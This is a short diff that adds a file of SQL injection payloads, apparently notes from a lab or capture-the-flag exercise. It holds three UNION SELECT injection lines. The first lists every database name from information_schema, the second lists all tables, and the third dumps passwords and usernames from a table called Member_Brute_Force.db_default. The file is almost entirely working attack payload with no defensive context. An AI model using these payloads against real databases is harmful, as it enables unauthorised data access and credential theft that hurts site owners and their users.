@@ -1,0 +1,7 @@
+1 UNION SELECT SCHEMA_NAME,NULL FROM information_schema.schemata--
+To have all database name
+
+1 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
+To have all tables
+
+1  UNION SELECT password,username from Member_Brute_Force.db_default --
